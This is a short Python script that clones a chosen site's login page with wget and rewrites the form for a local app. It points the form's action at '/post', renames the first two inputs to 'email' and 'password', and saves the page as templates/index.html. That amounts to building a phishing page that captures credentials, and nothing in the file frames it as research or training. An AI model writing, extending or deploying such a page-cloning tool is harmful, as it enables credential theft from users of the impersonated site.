import logging
import shutil
import subprocess
from pathlib import Path
import requests
import time
from bs4 import BeautifulSoup

DOMAIN = "your_domain"
PATH = "login"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("app.log"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)


def installed(*programs):
    return [program for program in programs if shutil.which(program)]


def sc(domain: str, path:str):
    url = f"https://{domain}/{path}"

    if "wget" not in installed("wget"):
        logger.error("wget is not installed.")
        return False

    try:
        response = requests.get(url, timeout=10)
    except requests.RequestException as e:
        logger.error("NO RESPONSE FOR %s! ERROR: %s", domain, e)
        return False

    statusc = response.status_code

    logger.info("%s returned HTTP status %s", domain, statusc)

    try:
        result = subprocess.run(
            [
                "wget",
                "--page-requisites",
                "--convert-links",
                "--adjust-extension",
                url
            ],
            check=True,
            text=True,
            capture_output=True
        )

        logger.info("wget succeeded for %s", domain)
        logger.info(result.stdout)

    except subprocess.CalledProcessError as e:
        logger.error("wget failed for %s: %s", domain, e)
        logger.error("wget output: %s", e.stderr)
        return False

    time.sleep(2)

    login_dir = Path(__name__).parent
    login_page = login_dir/DOMAIN/f"{PATH}.html" # needs to be file name

    if login_page.exists():
        print("True")

        print(login_page)

        with open(login_page, "r", encoding="utf-8") as f:
            soup = BeautifulSoup(f, "html.parser")

        form = soup.find("form")
        form["action"] = "/post"

        inputs = form.find_all("input")

        inputs[0]["name"] = "email"
        inputs[1]["name"] = "password"


        with open("templates/index.html", "w", encoding="utf-8") as f:
            f.write(str(soup))

sc(DOMAIN, PATH)


